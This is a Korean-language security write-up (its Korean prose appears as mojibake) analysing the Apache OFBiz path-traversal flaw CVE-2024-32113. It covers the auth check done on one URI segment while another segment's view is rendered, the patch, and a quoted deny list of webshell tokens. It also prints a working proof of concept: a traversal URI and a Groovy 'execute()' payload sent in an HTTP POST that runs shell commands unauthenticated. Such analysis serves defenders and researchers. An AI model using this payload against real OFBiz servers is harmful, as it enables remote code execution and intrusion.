# Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)

> ğŸ”– **Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°**
> 1. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: ê°œìš” (1/7)](/README.md)
> 2. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)](/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md)
> 3. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md)
> 4. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)](/04.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-38856/README.md) 
> 5. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) 
> 6. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) 
> 7. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-47208 (7/7)](/07.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-47208/README.md) 

# Introduction

Apache OFBizì—ì„œ ë°œìƒëœ 1-Day ì·¨ì•½ì  ì¤‘ ë¨¼ì € ì‚´í´ë³¼ ì·¨ì•½ì ì€ `CVE-2024-32113` ì…ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ OFBiz ë²„ì „ 18.12.12 ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” Path Traversal ì·¨ì•½ì ìœ¼ë¡œ, OFBiz í”„ë ˆì„ì›Œí¬ì˜ URL ìš”ì²­ì— ëŒ€í•œ ì»¨íŠ¸ë¡¤ëŸ¬(Controller)ì™€ ë·°(View)ì˜ ì²˜ë¦¬ ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì  ì…ë‹ˆë‹¤.

> ğŸ’¿ Apache OFBiz 18.12.12 Download Link
>
> [Apache Download Mirrors - v18.12.12 Download Link](https://www.apache.org/dyn/closer.lua/ofbiz/apache-ofbiz-18.12.12.zip)

## Vulnerability Detail

| CVE | CVE-2024-32113 |
| --- | --- |
| Vulnerability | Path Traversal |
| CVSS(3.x) | `CRITICAL` 9.8 |
| Product | Apache OFBiz |
| Version | <= 18.12.12 |
| Link | [`https://nvd.nist.gov/vuln/detail/CVE-2024-32113`](https://nvd.nist.gov/vuln/detail/CVE-2024-32113) |
| Description | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in Apache OFBiz.This issue affects Apache OFBiz: before 18.12.13. Users are recommended to upgrade to version 18.12.13, which fixes the issue. |

# Analysis

ì´ ì·¨ì•½ì ì€ Apache OFBiz í”„ë ˆì„ì›Œí¬ì˜ ë²„ì „ 18.12.12 ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” ê²½ë¡œ ì¡°ì‘(Path Traversal) ì·¨ì•½ì ì…ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì˜ ì£¼ìš” ì›ì¸ì€ OFBizì˜ URI ìš”ì²­ ì²˜ë¦¬ ê³¼ì •ì—ì„œ ì‚¬ìš©ì ì…ë ¥ê°’ì— ëŒ€í•œ ì¶©ë¶„í•œ ê²€ì¦ì´ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ ë°œìƒí•©ë‹ˆë‹¤.

## URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜

Apache OFBizëŠ” URI ìš”ì²­ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ ì»¨íŠ¸ë¡¤ëŸ¬(Controller)ì™€ ë·°(View) ë§¤í•‘ ë©”ì»¤ë‹ˆì¦˜ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ë©”ì»¤ë‹ˆì¦˜ì€ [`RequestHandler.java`](https://github.com/apache/ofbiz-framework/blob/43fd8328bc3dcff24e29b839c09cd632e90cb5c8/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java#L273) ì—ì„œ ì²˜ë¦¬ë˜ë©°, ì‚¬ìš©ìê°€ ìš”ì²­í•œ URI ê²½ë¡œë¥¼ ì»¨íŠ¸ë¡¤ëŸ¬ ë§¤í•‘ íŒŒì¼ì— ì •ì˜ëœ ë·° í…œí”Œë¦¿ìœ¼ë¡œ ì—°ê²°í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `/webtools/control/main/showDateTime` URIë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•  ê²½ìš° ë³€ìˆ˜ `path`, `requestUri`, `overrideViewUri` ëŠ” ë‹¤ìŒì˜ ê°’ì´ ì…‹íŒ… ë©ë‹ˆë‹¤.

- `path` /main/show/DateTime
- `requestUri` main
- `overrideViewUri` showDateTime

![image](./images/image-001.png)

ìš”ì²­í•œ URI(`/webtools/control/main/showDateTime`)ëŠ” ë³€ìˆ˜ `path` ë¡œ ì´ˆê¸°í™”ë˜ê³ , ë‚˜ë¨¸ì§€ ë³€ìˆ˜ `requestUri` ì™€ `overrideViewUri` ëŠ” ë©”ì„œë“œ `getRequestUri`, `getOverrideViewUri` ì— ë³€ìˆ˜ `path` ë¥¼ ì „ë‹¬í•˜ì—¬ ì´ˆê¸°í™”í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`getRequestUri` ë©”ì„œë“œëŠ” ì¸ìë¡œ ì „ë‹¬ë°›ì€ ë³€ìˆ˜ `path` ë¥¼ `/` ë¬¸ìë¡œ ë¶„í• í•˜ê³ , ì´í›„ ì²« ë²ˆì§¸ ìš”ì†Œë¥¼ ë°˜í™˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.

![image](./images/image-002.png)

ê·¸ ë‹¤ìŒ `getOverrideViewUri` ë©”ì„œë“œëŠ” `path`ë¥¼ `/`ë¡œ ë¶„í• í•œ í›„ ì²« ë²ˆì§¸ ìš”ì†Œë¥¼ ì œê±°í•˜ê³ , ë‚¨ì€ ìš”ì†Œë“¤ì„ `/`ë¡œ ì—°ê²°í•˜ì—¬ ë°˜í™˜í•©ë‹ˆë‹¤. (ìš”ì†Œê°€ í•œ ê°œë§Œ ë‚¨ì€ ê²½ìš° ê·¸ëŒ€ë¡œ ë°˜í™˜)

![image](./images/image-003.png)

ì´í›„ ë¡œì§ì€ ìš”ì²­ URIì— ëŒ€í•œ ì¸ì¦ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ë•Œ, ì¸ì¦ ê²€ì‚¬ëŠ” `overrideViewUri` ì˜ ê°’(`showDateTime`)ì´ ì•„ë‹Œ `requestUri` ê°’(`main`)ì— ëŒ€í•´ ì¸ì¦ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-004.png)

ë°˜ë©´ì—, ë·°(View) ë Œë”ë§ì€ ì¸ì¦ì„ ìˆ˜í–‰í•˜ì§€ ì•Šì€ `overrideViewUri` ì˜ ê°’(`showDateTime`)ì´ ë Œë”ë§ ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-005.png)

ê²°ê³¼ì ìœ¼ë¡œ, ê³µê²©ìëŠ” ì¸ì¦ë˜ì§€ ì•Šì€ ì»¨íŠ¸ë¡¤ëŸ¬(`requestUri`)ë¥¼ í†µí•´ ì¸ì¦ëœ ë·° ë§µ(`overrideViewUri`)ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” ë°©ë²•ìœ¼ë¡œ ê²½ë¡œ ì ‘ê·¼ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

ë‹¤ìŒìœ¼ë¡œ ì‚´í´ë³¼ `ProgramExport` ì„œë¹„ìŠ¤ëŠ” ì´ ì·¨ì•½ì ì„ í†µí•´ ê³µê²©ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì£¼ìš” ëŒ€ìƒ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤.

## ProgramExport ì„œë¹„ìŠ¤

`ProgramExport` ëŠ” `controller.xml` ì— `<request-map>` ìœ¼ë¡œ ì •ì˜ëœ ì„œë¹„ìŠ¤ë¡œ, URI `ProgramExport` ë¡œ ìš”ì²­ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ì¼ë¶€

```xml
<request-map uri="ProgramExport">
    <security https="true" auth="true"/>
    <response name="success" type="view" value="ProgramExport"/>
    <response name="error" type="view" value="ProgramExport"/>
</request-map>
```

ìœ„ `ProgramExport` ì„œë¹„ìŠ¤ê°€ ì •ì˜ëœ ë‚´ìš©ì„ ì‚´í´ ë³´ë©´, `auth` ì†ì„±ì´ `true` ë¡œ ë˜ì–´ ìˆìœ¼ë¯€ë¡œ, ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì(ë¹„ ë¡œê·¸ì¸ ìƒíƒœ)ê°€ `/webtools/control/ProgramExport` ë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•  ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ì¸ í˜ì´ì§€ê°€ ë Œë”ë§ë©ë‹ˆë‹¤.

![image](./images/image-006.png)

ë°˜ë©´ì—, ë¡œê·¸ì¸ ìƒíƒœë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•  ê²½ìš° `ProgramExport` ì„œë¹„ìŠ¤ì˜ ë·°ë¥¼ ë Œë”ë§í•˜ê¸° ìœ„í•´, í•´ë‹¹ ì„œë¹„ìŠ¤ì— ì •ì˜ëœ ì•„ë˜ì˜ ë·°ê°€ ë Œë”ë§ë©ë‹ˆë‹¤.

```xml
<response name="success" type="view" value="ProgramExport"/>
<response name="error" type="view" value="ProgramExport"/>
```

ì´ ë·°ëŠ” ê°™ì€ `controller.xml` íŒŒì¼ ë‚´ `<view-map>` ìœ¼ë¡œ ì •ì˜ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ì¼ë¶€

```xml
<view-map name="ProgramExport" type="screen" page="component://webtools/widget/EntityScreens.xml#ProgramExport"/>
```

ì´ì–´ì„œ í•´ë‹¹ `<view-map>` ìš”ì†Œì˜ `page` ê°’ ì¦‰, ì»´í¬ë„ŒíŠ¸ `EntityScreens.xml` ì˜ `ProgramExport` ìŠ¤í¬ë¦° ìœ„ì ¯(`type="screen"`)ì´ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ `ProgramExport` ìŠ¤í¬ë¦° ìœ„ì ¯ì€ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜ë˜ì–´ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/widget/EntityScreens.xml íŒŒì¼ ì¼ë¶€

```xml
<screen name="ProgramExport">
    <section>
        <actions>
            <set field="titleProperty" value="PageTitleEntityExportAll"/>
            <set field="tabButtonItem" value="programExport"/>
            <script location="component://webtools/groovyScripts/entity/ProgramExport.groovy"/>
        </actions>
        <widgets>
            <decorator-screen name="CommonImportExportDecorator" location="${parameters.mainDecoratorLocation}">
                <decorator-section name="body">
                     <screenlet>
                        <include-form name="ProgramExport" location="component://webtools/widget/MiscForms.xml"/>
                    </screenlet>
                    <screenlet>
                        <platform-specific>
                            <html><html-template location="component://webtools/template/entity/ProgramExport.ftl"/></html>
                        </platform-specific>
                    </screenlet>
                </decorator-section>
            </decorator-screen>
        </widgets>
    </section>
</screen>
```

ìœ„ ì •ì˜ëœ ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ `<script>` ìš”ì†Œ ë‚´ `location` ì†ì„± ê°’ì— í•´ë‹¹í•˜ëŠ” groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```xml
<script location="component://webtools/groovyScripts/entity/ProgramExport.groovy"/>
```

ìœ„ groovy ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/groovyScripts/entity/ProgramExport.groovy íŒŒì¼ ì¼ë¶€

```groovy
// ì¤‘ëµ

if (!parameters.groovyProgram) {
    groovyProgram = '''
		// ì¤‘ëµ
'''
    parameters.groovyProgram = groovyProgram
} else {
    groovyProgram = parameters.groovyProgram
}

// Add imports for script.
def importCustomizer = new ImportCustomizer()
importCustomizer.addImport("org.apache.ofbiz.entity.GenericValue")
importCustomizer.addImport("org.apache.ofbiz.entity.model.ModelEntity")
def configuration = new CompilerConfiguration()
configuration.addCompilationCustomizers(importCustomizer)

Binding binding = new Binding()
binding.setVariable("delegator", delegator)
binding.setVariable("recordValues", recordValues)

ClassLoader loader = Thread.currentThread().getContextClassLoader()
def shell = new GroovyShell(loader, binding, configuration)

if (UtilValidate.isNotEmpty(groovyProgram)) {
    try {
        // Check if a webshell is not uploaded but allow "import"
        if (!SecuredUpload.isValidText(groovyProgram, ["import"])) {
            logError("================== Not executed for security reason ==================")
            request.setAttribute("_ERROR_MESSAGE_", "Not executed for security reason")
            return
        }
        shell.parse(groovyProgram)
        shell.evaluate(groovyProgram)
        recordValues = shell.getVariable("recordValues")
        xmlDoc = GenericValue.makeXmlDocument(recordValues)
        context.put("xmlDoc", xmlDoc)
    } catch(MultipleCompilationErrorsException e) {
        request.setAttribute("_ERROR_MESSAGE_", e)
        return
    } catch(groovy.lang.MissingPropertyException e) {
        request.setAttribute("_ERROR_MESSAGE_", e)
        return
    } catch(IllegalArgumentException e) {
        request.setAttribute("_ERROR_MESSAGE_", e)
        return
    } catch(NullPointerException e) {
        request.setAttribute("_ERROR_MESSAGE_", e)
        return
    } catch(Exception e) {
        request.setAttribute("_ERROR_MESSAGE_", e)
        return
    }
}
```

ìœ„ì˜ ì½”ë“œë¥¼ ìì„¸íˆ ì‚´í´ë³´ë©´, `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

âœ…Â `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ ì„¤ëª…

1. íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬ëœ `groovyProgram`ì´ ì—†ìœ¼ë©´ ê¸°ë³¸ ìŠ¤í¬ë¦½íŠ¸ í…œí”Œë¦¿ì„ ì œê³µí•˜ê³ , ìˆìœ¼ë©´ í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
    
    ```groovy
    if (!parameters.groovyProgram) {
        groovyProgram = '''
    		// ì¤‘ëµ
        '''
        parameters.groovyProgram = groovyProgram
    } else {
        groovyProgram = parameters.groovyProgram
    }
    ```
    
2. `groovyProgram` ì— ëŒ€í•œ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.
    
    ```groovy
    if (!SecuredUpload.isValidText(groovyProgram, ["import"])) {
    ```
    
3. ìœ íš¨ì„± ê²€ì‚¬ í†µê³¼ í›„ ì‚¬ìš©ì ì…ë ¥ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
    
    ```groovy
    shell.parse(groovyProgram)
    shell.evaluate(groovyProgram)
    ```
    
4. ìµœì¢…ì ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê²°ê³¼ë¥¼ íŒŒì‹±í•œ í›„, ê²°ê³¼ë¥¼ XML ë¬¸ì„œë¡œ ë³€í™˜í•©ë‹ˆë‹¤.
    
    ```groovy
    recordValues = shell.getVariable("recordValues")
    xmlDoc = GenericValue.makeXmlDocument(recordValues)
    context.put("xmlDoc", xmlDoc)
    ```
    

ì—¬ê¸°ì„œ `isValidText` í•¨ìˆ˜ëŠ” ë‹¤ìŒì˜ `SecuredUpload.java` ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/security/src/main/java/org/apache/ofbiz/security/SecuredUpload.java íŒŒì¼ ì¼ë¶€

```java
public class SecuredUpload {

    private static final String MODULE = SecuredUpload.class.getName();
    private static final List<String> DENIEDFILEEXTENSIONS = getDeniedFileExtensions();
    private static final List<String> DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();
    private static final Integer MAXLINELENGTH = UtilProperties.getPropertyAsInteger("security", "maxLineLength", 10000);

    public static boolean isValidText(String content, List<String> allowed) throws IOException {
        return content != null ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -> isValid(content, token.toLowerCase(), allowed)) : false;
    }
```

ì´ë•Œ, ìœ íš¨ì„± ê²€ì‚¬ ìˆ˜í–‰ì„ ìœ„í•œ `DENIEDWEBSHELLTOKENS` ì˜ ê°’ì€ `security.properties` ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/security/config/security.properties íŒŒì¼ ì¼ë¶€

```yaml
deniedWebShellTokens=java.,beans,freemarker,<script,javascript,<body,body ,<form,<jsp:,<c:out,taglib,<prefix,<%@ page,<?php,exec(,alert(,\
                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\
                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\
                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\
                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,"cmd",*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate

```

ë”°ë¼ì„œ, `ProgramExport` ë·° ë§µì´ ë Œë”ë§ ë  ê²½ìš° `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ë¯€ë¡œ, íŒŒë¼ë¯¸í„° `groovyProgram` ë¥¼ ì „ë‹¬í•˜ì—¬ ì„ì˜ ì½”ë“œê°€ ë‹´ê¸´ groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ, ì…ë ¥í•œ íŒŒë¼ë¯¸í„° `groovyProgram` ì€ `isValidText` ë©”ì„œë“œì— ì˜í•´ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ë¯€ë¡œ `DENIEDWEBSHELLTOKENS` ì— ì •ì˜ëœ í‚¤ì›Œë“œê°€ í¬í•¨ë˜ì§€ ì•Šë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.

# Exploit

ìœ„ ë¶„ì„ ë‚´ìš©ì„ í† ëŒ€ë¡œ `ProgramExport` ë·° ë§µì„ ì‹¤í–‰ì‹œì¼œ `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ë‹¤ìŒì˜ ê³¼ì •ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

## ê²½ë¡œ ì¡°ì‘

URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜ì„ ì´ìš©í•˜ì—¬ ë‹¤ìŒì˜ URIë¥¼ êµ¬ì„±í•©ë‹ˆë‹¤.

```
/webtools/control/main/test/../ProgramExport
```

í•´ë‹¹ URIë¡œ ìš”ì²­ì„ ìˆ˜í–‰í•  ê²½ìš° [`RequestHandler.java`](https://github.com/apache/ofbiz-framework/blob/43fd8328bc3dcff24e29b839c09cd632e90cb5c8/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/RequestHandler.java#L273) ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ì²˜ë¦¬ ë©ë‹ˆë‹¤. ë³€ìˆ˜ `path`, `requestUri`, `overrideViewUri`ëŠ” ì•„ë˜ì™€ ê°™ì´ ê°’ì´ ì„¤ì •ë©ë‹ˆë‹¤.

- `path` /main/ProgramExport
- `requestUri` main
- `overrideViewUri` ProgramExport

![image](./images/image-007.png)

ì´í›„ ì¸ì¦ ì²˜ë¦¬ ê³¼ì •ì—ì„œëŠ” `requestUri` ì˜ ê°’ `main` ì„ ê²€ì‚¬í•˜ê²Œ ë©ë‹ˆë‹¤. 

![image](./images/image-008.png)

ì¦‰, `main` ì„œë¹„ìŠ¤ì˜ `auth` ì†ì„± ê°’ì´ ë‹¤ìŒê³¼ ê°™ì´ `false` ì´ë¯€ë¡œ, ì¸ì¦ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<request-map uri="main">
    <security https="true" auth="false"/>
    <response name="success" type="view" value="main"/>
</request-map>
```

ê·¸ ë‹¤ìŒ ì‹¤ì œ ë Œë”ë§ ë˜ëŠ” ë·°(`renderView`)ëŠ” ë‹¤ìŒê³¼ ê°™ì´ `ProgramExport` ê°€ ì „ë‹¬ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-009.png)

ë”°ë¼ì„œ, ìœ„ ê²½ë¡œ ì¡°ì‘ ê³¼ì •ì„ ì´ìš©í•˜ì—¬ ìµœì¢…ì ìœ¼ë¡œ `ProgramExport` ë·°ë¥¼ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ë Œë”ë§í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

## ì„ì˜ ëª…ë ¹ì–´ ì‹¤í–‰

`ProgramExport` ë·°ê°€ ë Œë”ë§ ë˜ë©´, ë‹¤ìŒê³¼ ê°™ì´ í•´ë‹¹ ë·° ì •ì˜ì— ì˜í•´ `ProgramExport.groovy` ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

![image](./images/image-010.png)

ì´ë•Œ, `ProgramExport.groovy` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë³´ë©´ `groovyProgram` íŒŒë¼ë¯¸í„°ë¥¼ `evaluate` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬í•˜ì—¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ, ì…ë ¥í•œ `groovyProgram` íŒŒë¼ë¯¸í„°ëŠ” `SecuredUpload.IsValidText` í•¨ìˆ˜ì— ì˜í•´ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤.

![image](./images/image-011.png)

ê·¸ëŸ¬ë‚˜ ìœ íš¨ì„± ê²€ì‚¬ í•„í„°ë§ ê°’(`security.properties` ë‚´ `deniedWebShellTokens`)ì„ ë³´ë©´ `execute` í•¨ìˆ˜ê°€ ì •ì˜ë˜ì–´ ìˆì§€ ì•ŠìŠµë‹ˆë‹¤

![image](./images/image-012.png)

ë”°ë¼ì„œ `groovyProgram` íŒŒë¼ë¯¸í„°ëŠ” ì•„ë˜ì˜ ì½”ë“œë¡œ êµ¬ì„±í•˜ì—¬ ì„ì˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```groovy
throw new Exception('ls -al'.execute().text);
```

## PoC

ìœ„ ë‚´ìš©ì„ í† ëŒ€ë¡œ ë‹¤ìŒì˜ HTTP Request íŒ¨í‚·ì„ ì „ë‹¬í•©ë‹ˆë‹¤.

```
POST /webtools/control/main/test/../ProgramExport HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 61

groovyProgram=throw+new+Exception('ls+-al'.execute().text);
```

ê·¸ ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì´ ì„ì˜ ëª…ë ¹ì–´(`ls -al`)ê°€ ì‹¤í–‰ë˜ì–´ ì‘ë‹µ ë°ì´í„°ì— ë°˜í™˜ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](./images/image-013.png)

# Patch

`CVE-2024-32113` ì·¨ì•½ì ì´ íŒ¨ì¹˜ëœ ë²„ì „(18.12.13)ì„ ì‚´í´ë³´ë©´, `ControlFilter.java` íŒŒì¼ì—ì„œ ìš”ì²­ëœ URLì„ ì •ê·œí™”(`normalize`)í•œ í›„, ì›ë˜ URLê³¼ ë¹„êµí•˜ì—¬ ë‹¤ë¥¼ ê²½ìš° ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.

> [https://github.com/apache/ofbiz-framework/compare/release18.12.12...release18.12.13#diff-ebc423ab3f878bfaf4d0cbbf5b1efa8f64706b199f8ae019609505d8c45ec654](https://github.com/apache/ofbiz-framework/compare/release18.12.12...release18.12.13#diff-ebc423ab3f878bfaf4d0cbbf5b1efa8f64706b199f8ae019609505d8c45ec654)
> 

![image](./images/image-014.png)

ë˜í•œ, `security.properties` íŒŒì¼ì—ì„œëŠ” `deniedWebShellTokens` í•„í„°ë§ì— `execute`, `println`, `calc` í‚¤ì›Œë“œê°€ ì¶”ê°€ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> [https://github.com/apache/ofbiz-framework/compare/release18.12.12...release18.12.13#diff-5d4b97fff9ee1d57e4c1d8274847e196ba5404f367afb3e39025f583a3e95e1a](https://github.com/apache/ofbiz-framework/compare/release18.12.12...release18.12.13#diff-5d4b97fff9ee1d57e4c1d8274847e196ba5404f367afb3e39025f583a3e95e1a)
> 

![image](./images/image-015.png)

# Continueâ€¦

ë‹¤ìŒì€ ë‘ ë²ˆì§¸ CVE ì·¨ì•½ì ì¸ [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md) ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

> ğŸ”– **Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°**
> 1. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: ê°œìš” (1/7)](/README.md)
> 2. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)](/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md)
> 3. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md)
> 4. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)](/04.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-38856/README.md) 
> 5. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) 
> 6. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) 
> 7. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-47208 (7/7)](/07.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-47208/README.md) 

---

# References

- https://nvd.nist.gov/vuln/detail/CVE-2024-32113
- https://issues.apache.org/jira/browse/OFBIZ-13006
- https://xz.aliyun.com/news/14170
- https://www.sonicwall.com/blog/sonicwall-discovers-second-critical-apache-ofbiz-zero-day-vulnerability